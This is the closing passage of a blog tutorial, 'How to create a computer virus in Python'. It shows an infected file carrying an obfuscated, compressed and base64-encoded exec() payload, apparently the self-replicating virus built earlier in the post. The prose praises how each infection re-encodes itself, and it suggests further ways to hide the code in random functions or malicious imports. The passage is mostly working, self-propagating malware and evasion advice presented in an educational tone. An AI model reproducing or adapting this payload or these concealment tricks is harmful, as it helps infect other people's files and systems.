<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span>exec<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;import zlib\nimport base64\nexec(zlib.decompress(base64.urlsafe_b64decode(b&#39;eNqVWEtv20YQPku_YksfTDUKwX3vFnCPPfYUoIc4IChxabOWSIGk4rhB_3tn9iFLfrSpgVgydzj8ZuabmY-5IlaUVJvlFdm4u67_qI2rqZFlK0xDt9SUrOXGNBtDlTVtUy6XYGqUNlQs_XeqBVd62e0PwziTTT05JfwBo1zRdP1uN2z8VcWsNiJdvq-n-123iY7gBptOun46uO0cPCkuGEsnw-QvCqv46bFj3TfDPrhRQojTwV_Ju7WA0wbIRjOm5LJxLblzc7Ud-tn1czW0VdvtXI6_Vr94S62FgXAWTT3X5Ib8PvTOX-faYNAEfq7I6Obj2JP53pHoigwtqQn6CfitltQsF4_dfE-Gg-v9I9YkG7MVqSeyf_IPDo-kEKphy0V6ZjwsRlc3u653U76KASlZxhrIUlGqlouIBO8MydaUgs0iYDbSQtFeRt21Vde3kOp6E2Nf-7LEDFBemvIHAiVDv3siXUs6X9X-GrjgXE-Cb9eQJxeKKaSxUMwU3rsFCJXipjSxaFJCAMtFO4wE8wCefaABpmSGWg1ZAwSIHk_RKpxyJa2FexcpQ6dCMq41sDRRRJX8dRalYUKV0UZorplP4rCZtsfR5R4E2TzNblqRj7-Gb-G5SjCpVcxetId8TTMUc4-587aQzP1hdNPU9XeYPuAycf12aOLfEMpZWxkpUkUi0HBYHMfdVLeu2ijh73Y5kr9Izj3ONbGrkFltKaYzBFUa8IgxzdBIE2R4XwGIKiKuvnbjcaq8y-evkR9cWF6mEE-3T54k3pigMakbH8007F1s1m6bSDSt38oAHH514_xmDii1JVRk0bvHM3DAps9fQsWgqEpdcuXZLgBnWmkkzKWPoj5AfzZ5dkWyD1ioPKAt8AP-3bmclv5ntfpAsts-C-nkVmuj3nXnQZzbS0qljumnMIGBg4uY7uYypEQzT5U8y4o_h67PLx-zWpPr49x-NNexulaX1jxT-Q3PwcxwbmVAoQ0wm3oWtB0UH5twquYhToe86Ub4GMYnwJQVWSq_VUbCg678TWSAso9-HiAD6pls654cBqxyV-9gQGzc80SIpWJMihPSz36WYN38F6gbbo4Cf-XZz8XhKVt9ia1VKpXmOewmrjz06bjfD321va8HGJSx0qWMGJ9JeaifdkPdxJVkGNRicRi7fs6zP4Ct0KZTt31Yk_a4fQCox0Pk5P6w67Y1oL_to51_1Jo8OozVTz3icx0LzWDhmYhTc-i5kOKY1DBuXzWVkQZ7HBAHO5wZ0AiYGVwF5BPEMQ7HGVmF-8QH5hOGKP0Qvp5IP7wxg9fJ5ekWv5VqAD3Nw55Az03d0ONwumzhEEHJYXAsF37E3qT1Xewb6UMp4uDJPBmz1aq4d9-a7s5Nc9xaRkCt4iyVVnIoG47sMERvfmgvpdWsDGNAnHfa5v9MsrhDYSLgjoCDeld99WRHrrtvbpvfZmeC4va2v5A78Lc38vO2caeJ-3ow4yHm5wNOljeArz5A0la32SoLmEQpYKvFTqO6xAnzSkU8BhWRqnymJTSIBCFx710cFo9jNwOK2z6pPph1vqRhRMHHRRL81SvYSc1HPDuzTMNPMvneY4JmwfoGY-hbwSMDmGXCmJMkOatOLLK1QjDfuieaQ8pGVB4nuofJ8XLjrMP86aYoV4AUGzc_uuAlqlgJcxydhyR8x8D-9j7xHgw3XprruykuDa5K4P8z0gp65Yb8Vu-m4JRKwTk7tzhbS0YoEWeB0tKKZPZGOw1Tcajn-wI51Nd7l1c-p1W1-u8mg66iHOoRn_6WxDp5izwDEZT2gKKgcS535_PWxNrhKTZtdmJPIEwK5EJ6WcgG99LrZc4-jceYstIqGlUeaHqQ3MH_xQ1xlHNjcZSfe3t3x0IpTNpuSiqmTrATk98DrSXz1v9SZ2ENQ5yLDWi5h_A8q0AeplcMKDA9rbUXe1dSZniyBDmnIkpuBLQr4pthzx5g0c-JLMJGlSo1Z8AcMAhYhfIaeeHl-di5r-6l9mpHmOvnrXPaB9N27A7xHYuDCnzJ25dNGUWD5FJFwMxvXnj4bhge_N6-kABDfFZ8IdSGlYFZabu_KTVS8xvQJF7Tv7Mso3oSHCgRyabhNQ_hbEFt-JgvFr2C_gOHlyIhHYn0pkEhPpAk7tvWHeYoczSscZQI9TTFbQGX4tuXshLU1hJCQYkT-6QUQD5E0ridmx05TpBvbOQp1GPv9qClgnMJwkuEvHSBiNDKKHmAbfmqeHBP8JHex2DpYcZRcHdt3n0uv5Cfbsh1dZ0MhKHMBgP88ZvpGlCQ739fF7gR6znv0lsAcLZkkYggkzj0Fpp2IQjIrYqpNajyQ-f8wH8R_APeFJAZ&#39;)))&#34;</span><span style=color:#ff79c6>)</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span style=color:#6272a4># end-8d35108ffe2ad173a697734a3e9938e1</span>
<span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">4</span>print<span style=color:#ff79c6>(</span><span style=color:#f1fa8c>&#34;hello world&#34;</span><span style=color:#ff79c6>)</span>
</code></pre></div><p>Look at that, it&rsquo;s not so easy to be read now, right? And every infection is different than the other one! Moreover, every time the infection is propagated, the compressed byte64 virus is compressed and encoded again and again.</p><p>And this is just a simple example of what one could do&mldr; for example, the virus could open the target and put this piece of code at the beginning of a random function, not always at the beginning of the file, or put it in another file and make just a call to this file with a malicious <code>import</code> statement or so&mldr;</p><h2 id=to-sum-up>To sum up</h2><p>In this article, we have seen that writing a computer virus in Python is a trivial operation, and even if it&rsquo;s probably not the best language to be used for writing viruses&mldr; it&rsquo;s worth keeping your eyes wide open, especially on a production server. :)</p><p>Happy coding!</p><p>D.</p></div></article><hr><h2 style=color:#2bbc8a;text-align:center>Did you find this article helpful?</h2><br><style>.bmc-button img{height:34px!important;width:35px!important;margin-bottom:1px!important;box-shadow:none!important;border:none!important;vertical-align:middle!important}.bmc-button{padding:7px 10px!important;line-height:35px!important;height:51px!important;min-width:217px!important;text-decoration:none!important;display:inline-flex!important;color:#fff!important;background-color:#ff813f!important;border-radius:5px!important;border:1px solid transparent!important;padding:7px 10px!important;font-size:22px!important;letter-spacing:.6px!important;box-shadow:0 1px 2px rgba(190,190,190,.5)!important;-webkit-box-shadow:0 1px 2px 2px rgba(190,190,190,.5)!important;margin:0 auto!important;font-family:cookie,cursive!important;-webkit-box-sizing:border-box!important;box-sizing:border-box!important;-o-transition:.3s all linear!important;-webkit-transition:.3s all linear!important;-moz-transition:.3s all linear!important;-ms-transition:.3s all linear!important;transition:.3s all linear!important}.bmc-button:hover,.bmc-button:active,.bmc-button:focus{-webkit-box-shadow:0 1px 2px 2px rgba(190,190,190,.5)!important;text-decoration:none!important;box-shadow:0 1px 2px 2px rgba(190,190,190,.5)!important;opacity:.85!important;color:#fff!important}</style><link href="https://fonts.googleapis.com/css?family=Cookie" rel=stylesheet><a class=bmc-button target=_blank href=https://www.buymeacoffee.com/dXjDHmt style=align:left><img src=https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg alt="Buy me a coffee!" align=left>
<span style=margin-left:15px;font-size:28px!important>Buy me a coffee!</span></a><hr><div class=blog-post-comments><div id=disquss_thread><script src=https://utteranc.es/client.js repo=mastro35/tpc issue-term=pathname label="The Python Corner" theme=github-dark crossorigin=anonymous async></script></div></div><div id=footer-post-container><div id=footer-post><div id=nav-footer style=display:none><ul><li><a href=../../>Home</a></li><li><a href=../../posts>Articles</a></li><li><a href=../../tags>Tags</a></li><li><a href=../../about>About</a></li><li><a href=../../help_us>Help Us</a></li><li><a href=https://buttondown.email/thepythoncorner>Newsletter</a></li><li><a href=https://shop.spreadshirt.com/the-python-corner>Swag Store</a></li></ul></div><div id=toc-footer style=display:none><nav id=TableOfContents><ul><li><a href=#trying-to-hide-the-virus-code-a-little-more>Trying to hide the virus code a little more</a></li><li><a href=#to-sum-up>To sum up</a></li></ul></nav></div><div id=share-footer style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f" aria-label=Facebook><i class="fab fa-facebook fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f&text=How%20to%20create%20a%20computer%20virus%20in%20Python" aria-label=Twitter><i class="fab fa-twitter fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f&title=How%20to%20create%20a%20computer%20virus%20in%20Python" aria-label=Linkedin><i class="fab fa-linkedin fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f&is_video=false&description=How%20to%20create%20a%20computer%20virus%20in%20Python" aria-label=Pinterest><i class="fab fa-pinterest fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=How%20to%20create%20a%20computer%20virus%20in%20Python&body=Check out this article: https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f" aria-label=Email><i class="fas fa-envelope fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f&title=How%20to%20create%20a%20computer%20virus%20in%20Python" aria-label=Pocket><i class="fab fa-get-pocket fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f&title=How%20to%20create%20a%20computer%20virus%20in%20Python" aria-label=reddit><i class="fab fa-reddit fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f&name=How%20to%20create%20a%20computer%20virus%20in%20Python&description=I%20was%20relaxing%20on%20a%20beach%20during%20my%20summer%20leave%20when%20I%20received%20a%20mail%20from%20a%20reader%20that%20asked%20me%20if%20it%20is%20technically%20possible%20to%20write%20a%20virus%20using%20Python.%0aThe%20short%20answer%3a%20YES.%0aThe%20longer%20answer%3a%20yes%2c%20BUT%26hellip%3b%0aLet%26rsquo%3bs%20start%20by%20saying%20that%20viruses%20are%20a%20little%20bit%20anachronistic%20in%202021%26hellip%3b%20nowadays%20other%20kinds%20of%20malware%20%28like%20worms%20for%20example%29%20are%20far%20more%20common%20than%20viruses.%20Moreover%2c%20modern%20operative%20systems%20are%20more%20secure%20and%20less%20prone%20to%20be%20infected%20than%20MS-DOS%20or%20Windows%2095%20were%20%28sorry%20Microsoft%26hellip%3b%29%20and%20people%20are%20more%20aware%20of%20the%20risk%20of%20malware%20in%20general." aria-label=Tumblr><i class="fab fa-tumblr fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fmastro35.github.io%2ftpc%2fposts%2f2021-08-30-how-to-create-virus-python%2f&t=How%20to%20create%20a%20computer%20virus%20in%20Python" aria-label="Hacker News"><i class="fab fa-hacker-news fa-lg" aria-hidden=true></i></a></li></ul></div><div id=actions-footer><a id=menu-toggle class=icon href=# onclick="return $('#nav-footer').toggle(),!1" aria-label=Menu><i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
<a id=toc-toggle class=icon href=# onclick="return $('#toc-footer').toggle(),!1" aria-label=TOC><i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
<a id=share-toggle class=icon href=# onclick="return $('#share-footer').toggle(),!1" aria-label=Share><i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
<a id=top style=display:none class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a></div></div></div><footer id=footer><div class=footer-left>Copyright &copy; 2021 Davide Mastromatteo</div><div class=footer-right><nav><ul><li><a href=../../>Home</a></li><li><a href=../../posts>Articles</a></li><li><a href=../../tags>Tags</a></li><li><a href=../../about>About</a></li><li><a href=../../help_us>Help Us</a></li><li><a href=https://buttondown.email/thepythoncorner>Newsletter</a></li><li><a href=https://shop.spreadshirt.com/the-python-corner>Swag Store</a></li></ul></nav></div></footer></div></body><link rel=stylesheet href=../../lib/font-awesome/css/all.min.css><script src=../../lib/jquery/jquery.min.js></script><script src=../../js/main.js></script><script src=../../js/code-copy.js></script></html>